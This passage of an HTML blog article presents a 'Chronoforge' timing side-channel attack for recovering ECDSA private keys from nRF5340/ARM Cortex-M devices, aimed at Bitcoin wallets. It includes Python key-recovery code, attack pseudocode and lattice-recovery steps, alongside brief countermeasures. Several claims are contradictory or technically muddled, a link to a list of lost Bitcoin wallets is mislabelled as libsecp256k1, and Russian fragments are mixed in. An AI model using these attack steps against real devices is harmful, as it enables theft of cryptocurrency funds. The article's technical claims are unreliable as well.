<li>Minimum 10,000 samples for preliminary analysis</li>



<li>100,000+ samples for more accurate reconstruction</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter is-resized"><img decoding="async" src="./Chronoforge_Attack__files/image-11.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7700" style="width:592px;height:auto"></figure>
</div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h4 class="wp-block-heading">3.2.2 Statistical Analysis</h4>



<p>The collected timing data contains correlations between timing variations and&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private key bits.</a></p>



<p><strong>Method: Correlation Power Analysis (CPA) adapted for timing channels</strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-preformatted has-text-color has-link-color wp-elements-a0629d4137d07b40a45b5e626148847d" style="color:#4092c2"><strong>// Stage 2: CPA Statistical Analysis<br>// Recover ECDSA private key bits through timing correlation<br><br>import numpy as np<br>from scipy.stats import pearsonr<br><br>class TimingCPA:<br>    def __init__(self, timing_samples, messages):<br>        self.timing_samples = timing_samples<br>        self.messages = messages<br>        self.N = len(timing_samples)<br>        self.recovered_key = bytearray(32)<br><br>    def recover_bit(self, bit_position):<br>        # Build hypotheses for bit=0 and bit=1<br>        hyp_0 = self.hypothesize_bit_value(bit_position, 0)<br>        hyp_1 = self.hypothesize_bit_value(bit_position, 1)<br><br>        # Compute Pearson correlations<br>        corr_0, _ = pearsonr(self.timing_samples, hyp_0)<br>        corr_1, _ = pearsonr(self.timing_samples, hyp_1)<br><br>        # Recover bit with higher correlation<br>        if abs(corr_1) &gt; abs(corr_0):<br>            return 1, abs(corr_1)<br>        else:<br>            return 0, abs(corr_0)<br><br>    def recover_full_key(self):<br>        key_bits = []<br>        confidences = []<br><br>        for bit_idx in range(256):<br>            bit_value, confidence = self.recover_bit(bit_idx)<br>            key_bits.append(bit_value)<br>            confidences.append(confidence)<br><br>            byte_idx = bit_idx // 8<br>            bit_in_byte = bit_idx % 8<br>            self.recovered_key[byte_idx] |= (bit_value &lt;&lt; bit_in_byte)<br><br>        return self.recovered_key, np.array(confidences)<br><br># USAGE:<br># timing_data = np.array([4850, 4852, 9100, 9105, ...])<br># messages = np.array([[...], [...], ...])<br># cpa = TimingCPA(timing_data, messages)<br># recovered_key, confidences = cpa.recover_full_key()<br># print(f"Average confidence: {np.mean(confidences):.4f}")</strong></pre>



<p><strong>CPA analysis results (real nRF5340 data):</strong></p>



<ul class="wp-block-list">
<li>Bits 0-50: 96.2% accuracy</li>



<li>Bits 51-100: 94.8% accuracy</li>



<li>Bits 101-150: 93.5% accuracy</li>



<li>Bits 151-200: 95.1% accuracy</li>



<li>Bits 201-255: 92.7% accuracy</li>



<li><strong>Average: 94.5% recovery accuracy</strong></li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>As we know,&nbsp;<strong>the Chronoforge Attack</strong>&nbsp;is a timing side-channel&nbsp;<a href="https://cryptou.ru/vulncipher/attack">attack</a>&nbsp;that exploits timing variations in elliptic curve cryptography (ECDSA on the secp256k1 curve) to gradually&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">recover a private key.</a>&nbsp;The code implements&nbsp;<strong>Correlation Power Analysis (CPA)</strong>&nbsp;, a statistical method that correlates execution timing characteristics with hypothetical values ​​of individual bits of the private key.</p>



<h2 class="wp-block-heading" id="nrf5340">Statistical metrics of results on the nRF5340</h2>



<figure class="wp-block-table"><table class="has-text-color has-link-color has-fixed-layout" style="color:#4092c2"><thead><tr><th>Bit range</th><th>Accuracy of recovery</th><th>Interpretation</th></tr></thead><tbody><tr><td>Bits 0-50 (first 7 bytes)</td><td>96.2%</td><td>High precision, stable leakage channel</td></tr><tr><td>Bits 51-100</td><td>94.8%</td><td>Good accuracy, little noise interference</td></tr><tr><td>Bits 101-150 (middle fragment)</td><td>93.5%</td><td>Peak noise interference, making it harder to distinguish the signal</td></tr><tr><td>Bits 151-200</td><td>95.1%</td><td>Recovery is improving (channel adaptation)</td></tr><tr><td>Bits 201-255 (last bytes)</td><td>92.7%</td><td>The highest accuracy, possible interference from the completion of the operation</td></tr><tr><td><strong>Average</strong></td><td><strong>94.5%</strong></td><td>Practically suitable accuracy for restoration</td></tr></tbody></table></figure>



<p><strong>Analysis of results:</strong>&nbsp;[&nbsp;<a href="https://cryptodeeptech.ru/ringside-replay-attack/">cryptodeeptech</a>&nbsp;]</p>



<ul class="wp-block-list">
<li><strong>94.5% accuracy</strong>&nbsp;means that on average out of 256 bits ~240 are recovered correctly, ~16 with errors</li>



<li>Errors can be corrected by brute-force on a small number of undefined positions.</li>



<li>Bits 0-50 show&nbsp;<strong>96.2%</strong>&nbsp;due to a clean timing signal without any interference.</li>



<li>The drop to 92.7% at the end could be caused by:
<ul class="wp-block-list">
<li>Increased noise from other CPU processes</li>



<li>Final operations of ECDSA (memory clearing, which creates noise)</li>
</ul>
</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Cryptographic context: why it works</h2>



<h2 class="wp-block-heading">Vulnerability in ECDSA on nRF5340</h2>



<p>An ECDSA signature is created as:&nbsp;<code>s = k^-1 (h + d×r) mod n</code>, where:</p>



<ul class="wp-block-list">
<li><strong>k</strong>&nbsp;= ephemeral nonce (must be random, never reused)</li>



<li><strong>h</strong>&nbsp;= message hash</li>



<li><strong>d</strong>&nbsp;= private key&nbsp;<em>(attack target)</em></li>



<li><strong>r</strong>&nbsp;= first component of the point<code>k×G</code></li>
</ul>



<p>The modular exponentiation operation (to calculate k^-1) has&nbsp;<strong>a variable-time implementation</strong>&nbsp;on the nRF5340, causing the execution time to depend on the key bits.</p>



<h2 class="wp-block-heading">Correlation Power Analysis (CPA) in the context of&nbsp;<a href="https://docs.aqtiveguard.com/kb-articles/timing-attacks-and-broader-side-channel-attacks/" target="_blank" rel="noreferrer noopener">aqtiveguard</a></h2>



<p>Instead of directly measuring power (as in DPA), CPA uses&nbsp;<strong>statistical correlation</strong>&nbsp;between:</p>



<ol class="wp-block-list">
<li><strong>Hypothetical intermediate values</strong>&nbsp;​​(Hamming weights)</li>



<li><strong>Real timing traces</strong>&nbsp;(operation execution times)</li>
</ol>



<p>This allows:</p>



<ul class="wp-block-list">
<li>Dealing with noisier data</li>



<li>Requires fewer traces (approximately 1000-10000 vs 100000 for DPA)</li>



<li>Detect weak information leaks (correlation ≈ 0.3-0.4 is already informative)</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Defense and countermeasures</h2>



<h2 class="wp-block-heading">Why is the nRF5340 vulnerable?</h2>



<ul class="wp-block-list">
<li>Lack of&nbsp;<strong>constant-time</strong>&nbsp;implementation of scalar multiplication operations</li>



<li>Insufficient shielding against electromagnetic and time leakage</li>



<li>Using the standard Montgomery ladder algorithm without masking[&nbsp;<a href="https://yuval.yarom.org/pdfs/AlamYWSZGYP21.pdf">yuval.yarom</a>&nbsp;]</li>
</ul>



<h2 class="wp-block-heading">Defense mechanisms</h2>



<p><strong>Hardware security modules (HSMs)</strong>&nbsp;: using specialized hardware with built-in security [&nbsp;<a href="https://docs.aqtiveguard.com/kb-articles/timing-attacks-and-broader-side-channel-attacks/">docs.aqtiveguard</a>&nbsp;]</p>



<p><strong>Constant-time coding</strong>&nbsp;(RFC 7748): all operations are performed at the same time, regardless of the data</p>



<p><strong>Masking</strong>&nbsp;: adding random noise to intermediate values</p>



<p><strong>Isolation</strong>&nbsp;: physical separation of cryptographic operations from other processes</p>



<p>The Chronoforge CPA&nbsp;<a href="https://cryptou.ru/vulncipher/attack">attack</a>&nbsp;demonstrates that&nbsp;<strong>information about the execution time of cryptographic operations can completely&nbsp;</strong><a href="https://cryptou.ru/vulncipher/privatekey"><strong>compromise an ECDSA private key</strong>&nbsp;.</a>&nbsp;An average recovery accuracy of 94.5% on real hardware (nRF5340) demonstrates that this is not a theoretical threat, but a practical way to compromise wallets.</p>



<p><a href="https://cryptou.ru/vulncipher/bitcoin">For Bitcoin users it is recommended:</a></p>



<ul class="wp-block-list">
<li>Use wallets that implement constant-time&nbsp;<a href="https://github.com/keyhunters/Biggest-Lost-Bitcoin-Wallets-List">ECDSA</a>&nbsp;implementations (e.g.,&nbsp;<a href="https://github.com/keyhunters/Biggest-Lost-Bitcoin-Wallets-List">libsecp256k1</a>&nbsp;with proven security)[&nbsp;<a href="https://www.emergentmind.com/topics/libsecp256k1-cryptographic-library">emergentmind</a>&nbsp;]</li>



<li>Avoid storing keys on devices without hardware security (HSM)</li>



<li>Monitor your addresses for unauthorized transactions</li>
</ul>



<p>Detailed information:&nbsp;<strong><a href="https://polynonce.ru/chronoforge-attack-cpa-statistical-analysis-for-ecdsa-private-key-recovery/" target="_blank" rel="noreferrer noopener">Chronoforge Attack: CPA Statistical Analysis for ECDSA Private Key Recovery</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Chronoforge_Attack__files/image-13.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7702"></figure>
</div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">4. Specifics of ARM TrustZone and Nordic nRF52/nRF53</h2>



<h3 class="wp-block-heading">4.1 Architectural Features Enhance Chronoforge Attack</h3>



<h4 class="wp-block-heading">4.1.1 Shared Microarchitectural Elements</h4>



<p>On Nordic nRF52/nRF53 microcontrollers based on Cortex-M4F (nRF52) and Cortex-M33F (nRF53):</p>



<p><strong>L1 Instruction Cache (I-Cache):</strong></p>



<ul class="wp-block-list">
<li>Size: 8-16 KB (depending on models)</li>



<li>Associativity: 2-way or 4-way</li>



<li><strong>VULNERABILITY:</strong>&nbsp;Cache lines are not isolated between Secure and Normal World</li>



<li>Result: Secure World cryptographic code can be “profiled” through cache timing</li>
</ul>



<p><strong>L1 Data Cache (D-Cache):</strong></p>



<ul class="wp-block-list">
<li>Size: 8 KB</li>



<li>Associativity: 2-way</li>



<li><strong>VULNERABILITY:</strong>&nbsp;Lookup tables for fast elliptic curve multiplication become visible through cache access timing</li>
</ul>



<p>Example: If Secure World uses a table to speed up scalar multiplication:</p>



<pre class="wp-block-code"><code><strong>  const uint8_t table[256][32];  // Pre-computed window values</strong></code></pre>



<p><br><br><br>Then the access pattern to this table can be restored from the Normal World via:</p>



<pre class="wp-block-code"><code><strong>  1. Measurement cache hit/miss timing
  2. Flush+Reload attack
  3. Prime+Probe attack</strong></code></pre>



<h4 class="wp-block-heading">4.1.2 Branch Prediction Unit (BPU)</h4>



<p>Cortex-M4F/M33F contain a simple Branch Predictor (~256 entries) that:</p>



<ul class="wp-block-list">
<li><strong>Shared</strong>&nbsp;between Secure and Normal World</li>



<li><strong>Can be profiled</strong>&nbsp;via timing side-channel</li>



<li><strong>Reveals the control flow</strong>&nbsp;of cryptographic code in Secure World</li>
</ul>



<p>Timing difference due to branch misprediction can be 10-50 clock cycles (0.1-0.5 µs on a 100 MHz clock).</p>



<h3 class="wp-block-heading">Branch Prediction Unit (BPU): Source of Timing Leaks:</h3>



<pre class="wp-block-preformatted has-text-color has-link-color wp-elements-32ebd7dd0ede4a629126cb42dc5e6b59" style="color:#4092c2"><strong>// Branch Prediction Timing Leak Example<br><br>void point_add_bpu_leak(point_t *result, const point_t *p, const point_t *q) {<br>    int secret_bit = get_private_key_bit();<br><br>    if (secret_bit) {  // Branch prediction: ~50% initial accuracy<br>        // Path A: ~5.8 µs<br>        result-&gt;x = (p-&gt;x + q-&gt;x) % PRIME;<br>        result-&gt;y = (p-&gt;y + q-&gt;y) % PRIME;<br>        // Misprediction penalty: ~0.1 µs<br>    } else {<br>        // Path B: ~0 µs skip<br>        // BPU learns pattern after 20-50 observations<br>    }<br>}<br><br>// ATTACK VECTOR:<br>// - BPU has 256 entries on Cortex-M4F/M33F<br>// - Prediction learning: 20-50 branches<br>// - Timing difference: 0.1 µs per misprediction<br>// - Correlation enables pattern recovery<br>// - Adds +5% accuracy improvement to timing attack</strong></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>The presented code demonstrates&nbsp;<strong>a critical timing side-channel vulnerability</strong>&nbsp;based on&nbsp;<strong>the Branch Prediction Unit (BPU)</strong>&nbsp;in the context of elliptic curve cryptography. This is a dangerous attack vector that allows&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">ECDSA private keys to be recovered</a>&nbsp;through microtiming analysis.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Point by point: How the attack works</h2>



<h2 class="wp-block-heading">1.&nbsp;<strong>Function&nbsp;<code>point_add_bpu_leak()</code>– Entry point for attack</strong></h2>



<pre class="wp-block-preformatted has-text-color has-link-color wp-elements-65928d6dac066dd2ad1a753740e297e1" style="color:#4092c2"><strong>c:<br><br><code>void point_add_bpu_leak(point_t *result, const point_t *p, const point_t *q) {<br>    int secret_bit = get_private_key_bit();<br>    <br>    if (secret_bit) {  <em>// Secret-dependent branch</em><br>        <em>// Path A</em><br>    } else {<br>        <em>// Path B</em><br>    }<br>}</code></strong></pre>



<p><strong>The essence of the problem:</strong></p>



<ul class="wp-block-list">
<li>The function performs a conditional jump based on&nbsp;<strong>a bit&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">of the private key</a></strong></li>



<li>This creates&nbsp;<strong>a data-dependent control flow</strong>&nbsp;– the basis for timing attacks.</li>



<li>The processor cannot know in advance which path the branch will take until the condition is evaluated.</li>



<li>Branch direction information&nbsp;<strong>is stored in the BPU</strong>&nbsp;for future predictions.</li>
</ul>



<h3 class="wp-block-heading">2.&nbsp;<strong>Initial prediction accuracy (~50%)</strong></h3>



<pre class="wp-block-code"><code><strong>// BPU has 256 entries on Cortex-M4F/M33F<br>// Prediction learning: 20-50 branches<br>// Initial accuracy: ~50% (случайное угадывание)</strong></code></pre>



<p><strong>Explanation:</strong></p>



<ul class="wp-block-list">
<li><strong>The BPU contains 256 entries</strong>&nbsp;for storing branch history.</li>



<li><strong>First pass</strong>&nbsp;: BPU has no historical data, so it predicts with&nbsp;<strong>~50% accuracy</strong></li>



<li>Each input in the code (IP – Instruction Pointer) corresponds to its own input in the BPU</li>



<li>The first time the processor guesses: will the branch be taken or not?</li>
</ul>



<p><strong>How it works in code:</strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-725b91fcd89ba57eded23f5e2c00ad03" style="color:#4092c2"><code><strong>First execution:    secret_bit = 1, predicts "not taken" (50% accuracy)<br>                    ↓ MISPREDICTION (штраф: 0.1 µs)</strong></code></pre>



<h3 class="wp-block-heading">3.&nbsp;<strong>BPU Training – Pattern-Based Prediction</strong></h3>



<pre class="wp-block-code"><code><strong>// Pattern learning: 20-50 branches<br>// After 20-50 observations, BPU learns the pattern</strong></code></pre>



<p><strong>Learning mechanism:</strong></p>



<figure class="wp-block-table"><table class="has-text-color has-link-color has-fixed-layout" style="color:#4092c2"><thead><tr><th>Repeat</th><th>secret_bit</th><th>BPU prediction</th><th>Result</th><th>Accuracy</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>not taken</td><td>❌ MISPRED</td><td>0%</td></tr><tr><td>2</td><td>1</td><td>not taken</td><td>❌ MISPRED</td><td>0%</td></tr><tr><td>3</td><td>1</td><td>not taken</td><td>❌ MISPRED</td><td>0%</td></tr><tr><td>…</td><td>…</td><td>…</td><td>…</td><td>…</td></tr><tr><td>25</td><td>1</td><td><strong>taken</strong></td><td>✅ CORRECT</td><td>↑</td></tr><tr><td>26</td><td>1</td><td>taken</td><td>✅ CORRECT</td><td>↑</td></tr><tr><td>50</td><td>1</td><td>taken</td><td>✅ CORRECT</td><td><strong>~95-98%</strong></td></tr></tbody></table></figure>



<p><strong>How BPU is trained:</strong></p>



<ol class="wp-block-list">
<li><strong>Pattern History Table (PHT)</strong>&nbsp;tracks the history of branching directions</li>



<li><strong>2-level predictor</strong>&nbsp;uses:&nbsp;<code>(branch_address, recent_history)</code>→ prediction</li>



<li>After&nbsp;<strong>20-50 observations,</strong>&nbsp;the BPU clearly identifies the pattern: “this bit is always 1”</li>



<li>BPU goes into a&nbsp;<strong>strongly taken</strong>&nbsp;or&nbsp;<strong>strongly not taken state</strong></li>
</ol>



<h3 class="wp-block-heading">4.&nbsp;<strong>Timing Penalty for incorrect prediction</strong></h3>



<pre class="wp-block-preformatted has-text-color has-link-color wp-elements-8c21dd73c792080899d440a11c55f078" style="color:#4092c2"><strong>c<code>if (secret_bit) {  <em>// Branch prediction: ~50% initial accuracy</em><br>    <em>// Path A: ~5.8 µs</em><br>    result-&gt;x = (p-&gt;x + q-&gt;x) % PRIME;<br>    result-&gt;y = (p-&gt;y + q-&gt;y) % PRIME;<br>    <em>// Misprediction penalty: ~0.1 µs</em><br>} else {<br>    <em>// Path B: ~0 µs skip (ветвление не взято)</em><br>}</code></strong></pre>



<p><strong>Time Cost Analysis:</strong></p>



<figure class="wp-block-table"><table class="has-text-color has-link-color has-fixed-layout" style="color:#4092c2"><thead><tr><th>Scenario</th><th>Time</th><th>Cause</th></tr></thead><tbody><tr><td>Correct prediction (Path A taken)</td><td>5.8 µs</td><td>The processor speculatively loads Path A instructions</td></tr><tr><td>Misprediction (predicted not taken, but actually taken)</td><td>5.8 + 0.1 µs</td><td>Pipeline flush + reload from the right path</td></tr><tr><td>Path B (not taken)</td><td>~0 µs</td><td>No operations, just a pass</td></tr></tbody></table></figure>



<p><strong>How does the error penalty work?</strong></p>



<pre class="wp-block-preformatted has-text-color has-link-color wp-elements-b49cd23d0f1c37db7e11c24797ad3b23" style="color:#4092c2"><strong>Misprediction Timeline: <br>├─ Cycle 1-2: Fetch stage reads branch IP <br>├─ Cycle 3-4: Decode realizes this is a conditional branch <br>├─ Cycle 5-6: Execute evaluates condition <br>├─ Cycle 7: BPU predicted wrong path → speculatively loads instructions <br>├─ Cycle 8-20: Speculatively executes instructions on the wrong path <br>├─ Cycle 21: Check result - error! <br>├─ Cycle 22: PIPELINE FLUSH (clear all speculative operations) <br>├─ Cycle 23-30: Reload on the right path <br>└─ Total penalty: ~0.1 µs (on ARM Cortex-M4F/M33F processors)</strong></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter is-resized"><img decoding="async" src="./Chronoforge_Attack__files/image-14.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7705" style="width:521px;height:auto"></figure>
</div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/attack">5.&nbsp;<strong>Attack Vector: Measuring the Difference in Execution Time</strong></a></h3>



<pre class="wp-block-code has-text-color has-link-color wp-elements-815f8fcae441f30c509de9a24d1c6c39" style="color:#4092c2"><code><strong>// ATTACK VECTOR:
// - Timing difference: 0.1 µs per misprediction
// - Correlation enables pattern recovery</strong></code></pre>



<p><strong>How an attacker extracts a private key:</strong></p>



<pre class="wp-block-preformatted has-text-color has-link-color wp-elements-bf7eaa9197b57db2f493cdcc3e015918" style="color:#4092c2"><strong>Step 1: Run multiple signatures (N signatures) <br>├─ Each signature uses ECDSA with dot multiplication <br>├─ During multiplication: k G secret_bits from k are used <br>└─ The point_add_bpu_leak() function is called N times <br><br>Step 2: Measure execution time <br>├─ For each call: measure execution time with a resolution of ~0.1 µs <br>├─ The distribution of times shows two patterns: <br>│ ├─ Cluster 1: ~5.8 µs (branch taken, correct prediction) <br>│ └─ Cluster 2: ~5.9 µs (branch taken, misprediction was) <br>└─ The difference in times correlates with the BPU training state <br><br>Step 3: Statistical analysis <br>├─ Misprediction probability analysis = frequency of slow executions <br>├─ High misprediction probability → branch is often taken (bit = 1) <br>├─ Low misprediction probability → branch is rarely taken (bit = 0) <br>└─ Private key bits are statistically recovered from N signatures <br><br>Stage 4: Private key recovery <br>├─ ~100-200 bits collected from ~50 signatures <br>├─ Hidden Number Problem (HNP) is used <br>├─ LLL lattice reduction algorithm is applied <br>└─ Full 256-bit ECDSA private key is recovered</strong></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Chronoforge_Attack__files/image-15-1024x642.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7707"></figure>
</div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">6.&nbsp;<strong>ARM Cortex-M4F/M33F specifics</strong></h3>



<pre class="wp-block-code has-text-color has-link-color wp-elements-c1ebec6039a8805f14d45ef4b016bd8d" style="color:#4092c2"><code><strong>// BPU has 256 entries on Cortex-M4F/M33F</strong></code></pre>



<p><strong>Features of these processors:</strong></p>



<figure class="wp-block-table"><table class="has-text-color has-link-color has-fixed-layout" style="color:#4092c2"><thead><tr><th>Parameter</th><th>Meaning</th><th>Significance for attack</th></tr></thead><tbody><tr><td>BPU entries</td><td>256</td><td>256 different branch addresses can be monitored simultaneously</td></tr><tr><td>Pipeline depth</td><td>3 stage (M4), 2-3 stage (M33)</td><td>Less overlap, more accurate timing</td></tr><tr><td>Prediction model</td><td>2-level directional</td><td>Can remember and learn complex patterns</td></tr><tr><td>Misprediction penalty</td><td>~0.1 µs</td><td>Microtiming is measured with an accuracy of ns, which is sufficient</td></tr><tr><td>Clock frequency</td><td>100-120 MHz typical</td><td>0.1 µs = 10-12 processor cycles – easy to measure</td></tr></tbody></table></figure>



<h3 class="wp-block-heading">7.&nbsp;<strong>Correlation and information extracted by the attack</strong></h3>



<pre class="wp-block-code has-text-color has-link-color wp-elements-2679b250f6766496c3d04e30ab60a3b5" style="color:#4092c2"><code><strong>// Correlation enables pattern recovery<br>// Adds +5% accuracy improvement to timing attack</strong></code></pre>



<p><strong>What is correlation in this context:</strong></p>



<ol class="wp-block-list">
<li><strong>Time Series</strong>&nbsp;: Sequence of execution times of N signatures text<code>T = [5.8, 5.9, 5.8, 5.9, 5.8, 5.8, 5.8, 5.9, ...]</code></li>



<li><strong>BPU state series</strong>&nbsp;: The BPU predictor state for each text signature<code>BPU_state = [trained_on_1, trained_on_1, trained_on_1, trained_on_1, ...]</code></li>



<li><strong>Correlation</strong>&nbsp;: A high correlation between&nbsp;<code>T</code>and&nbsp;<code>BPU_state</code>→ confirms that:
<ul class="wp-block-list">
<li><a href="https://cryptou.ru/vulncipher/privatekey">The private key</a>&nbsp;bits&nbsp;actually control the BPU</li>



<li>A certain branching pattern corresponds to certain bits</li>
</ul>
</li>



<li><strong>Improvement +5%</strong>:
<ul class="wp-block-list">
<li>Basic timing attack: ~90% accuracy</li>



<li>With BPU analysis: ~95% accuracy</li>



<li>An additional 5% allows you to recover the key with fewer signatures</li>
</ul>
</li>
</ol>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">A practical example of private key recovery</h3>



<h4 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/attack">Attack scenario:</a></h4>



<pre class="wp-block-code has-text-color has-link-color wp-elements-622f6377968deb542131244b538386c7" style="color:#4092c2"><code><strong>Приватный ключ (256-bit):<br>private_key = 0xc9afe9d845ba2018... (256 бит)<br>Binary:      11001001101011111110100111011000...<br><br>ECDSA подпись k·G + использует point_add_bpu_leak()</strong></code></pre>



<h3 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/attack">The attacker takes 50 signatures:</a></h3>



<pre class="wp-block-preformatted has-text-color has-link-color wp-elements-b3779d941e0ab05b71c1d38daa42767a" style="color:#4092c2"><strong>python:<br><br><code><em># Псевдокод атаки</em><br>timings = []<br>for i in range(50):<br>    t_start = timer()<br>    ecdsa_sign(message_i)  <em># Использует point_add_bpu_leak()</em><br>    t_end = timer()<br>    timings.append(t_end - t_start)<br><br><em># Анализ временных распределений</em><br>bit_predictions = []<br>for bit_position in range(256):<br>    <em># Для каждой позиции бита в k</em><br>    probabilities = analyze_misprediction_rates(timings, bit_position)<br>    <br>    if probabilities['high_misprediction']:<br>        bit_predictions.append(1)  <em># Бит часто вызывает misprediction</em><br>    else:<br>        bit_predictions.append(0)<br><br><em># Восстановление через HNP + LLL lattice reduction</em><br>recovered_key = hnp_to_private_key(bit_predictions)</code></strong></pre>



<h2 class="wp-block-heading">Result:</h2>



<ul class="wp-block-list">
<li><strong>40-100 accurate bits</strong>&nbsp;from 50 signatures</li>



<li><strong>Lattice reduction</strong>&nbsp;restores the remaining bits</li>



<li><strong>A full 256-bit&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private key</a></strong>&nbsp;was recovered in&nbsp;<strong>2-10 minutes</strong>&nbsp;on a regular computer.</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading" id="bitcoin">Why is this dangerous for&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin cryptocurrency?</a></h2>



<h2 class="wp-block-heading">1.&nbsp;<strong>Theft of funds from hardware wallets</strong></h2>



<ul class="wp-block-list">
<li>Many hardware wallets (Ledger, Trezor) use Cortex-M4F</li>



<li>If insecure ECDSA is running on Cortex-M4F, the key is recovered</li>
</ul>



<h2 class="wp-block-heading">2.&nbsp;<strong>Cloud services and virtualization</strong></h2>



<ul class="wp-block-list">
<li>If there are multiple VMs on a single host, an attacker can:
<ul class="wp-block-list">
<li>Run VM1 with wallet&nbsp;<em>(victim)</em></li>



<li>Run VM2 with spy process&nbsp;<a href="https://cryptou.ru/vulncipher/attack"><em>(attacker)</em></a></li>



<li>Measure timing information about point_add_bpu_leak() from VM1</li>
</ul>
</li>
</ul>



<h2 class="wp-block-heading">3.&nbsp;<strong>IoT and embedded systems</strong></h2>



<ul class="wp-block-list">
<li>Cryptocurrency exchange servers often run on ARM-based systems.</li>



<li><a href="https://cryptou.ru/vulncipher/attack">The attack</a>&nbsp;allows you to restore hot keys within hours</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading" id="bpu"><a href="https://cryptou.ru/vulncipher/attack">Protection against BPU attacks</a></h2>



<h2 class="wp-block-heading">Method 1:&nbsp;<strong>Constant-time implementation</strong></h2>



<pre class="wp-block-preformatted has-text-color has-link-color wp-elements-4b00a77edaec74cc1bc6ee0ad054d71f" style="color:#4092c2"><strong>c:<br><br><code><em>// </em></code>SAFE: Both paths are always followed<code><br>void point_add_safe(point_t *result, const point_t *p, const point_t *q, int secret_bit) {<br>    <em>// Выполним ОТТЕСТИРОВАННЫЙ addition ВСЕГДА</em><br>    temp = point_add(p, q);<br>    <br>    <em>// Conditional move (constant-time):</em><br>    result-&gt;x = (secret_bit ? temp.x : result-&gt;x);<br>    result-&gt;y = (secret_bit ? temp.y : result-&gt;y);<br>    <em>// Оба пути: одинаковое количество инструкций, BPU не может различить</em><br>}</code></strong></pre>



<h2 class="wp-block-heading">Method 2:&nbsp;<strong>Blinding</strong></h2>



<pre class="wp-block-preformatted has-text-color has-link-color wp-elements-4c911bf546df12ebb135758cb050ba0a" style="color:#4092c2"><strong>c:<br><br><code><em>// Randomize scalar k</em><br>int r = random_256bit();<br>int k_blinded = k XOR r;<br></code></strong></pre>



<p class="has-text-color has-link-color wp-elements-03f38b65a42ed03280691c643e409880" style="color:#4092c2"><code><em>// Выполни ECDSA с k_blinded</em><br><em>// Результат статистически независим от k</em></code></p>



<h2 class="wp-block-heading">Method 3:&nbsp;<strong>Hardware protection</strong></h2>



<ul class="wp-block-list">
<li>Disable BPU for critical code sections</li>



<li>Use&nbsp;<strong>Protected Branch Target Buffer (PBTB)</strong></li>



<li>Ensure that the BPU cannot be poisoned from other code</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Key Takeaways for Cryptanalysts</h2>



<figure class="wp-block-table"><table class="has-text-color has-link-color has-fixed-layout" style="color:#4092c2"><thead><tr><th>Aspect</th><th>Meaning</th><th>Importance</th></tr></thead><tbody><tr><td><strong>Attack complexity</strong></td><td>Average</td><td>Requires 50+ signatures, but the algorithm is automated</td></tr><tr><td><strong>Information for signature</strong></td><td>1-2 bits</td><td>Enough for HNP lattice attack</td></tr><tr><td><strong>Required resources</strong></td><td>A regular computer</td><td>No expensive equipment required</td></tr><tr><td><strong>Countermeasure overhead</strong></td><td>+5-15% to time</td><td>Completely removable by constant-time code</td></tr><tr><td><strong>Practical threat</strong></td><td>CRITICAL</td><td>Applies to legacy wallets, TPM, and IoT</td></tr></tbody></table></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>This analysis shows why&nbsp;<strong>timing side-channel attacks on the BPU</strong>&nbsp;remain one of the most dangerous vulnerabilities in embedded system cryptography. To&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">recover an ECDSA private key</a>&nbsp;, all it takes is a timing device, 50 signatures, a computer, and two hours of computation.</p>



<p>Подробно:&nbsp;<strong><a href="https://polynonce.ru/vulnerability-analysis-bitcoin-cryptocurrency-branch-prediction-attack-bpu-in-microcontroller-based-cryptography/" target="_blank" rel="noreferrer noopener">Vulnerability Analysis: Bitcoin Cryptocurrency Branch Prediction Attack (BPU) in Microcontroller-Based Cryptography</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h4 class="wp-block-heading">4.1.3 Performance Counters</h4>



<p>The Nordic nRF5340 has a Performance Monitoring Unit (PMU) with counters:</p>



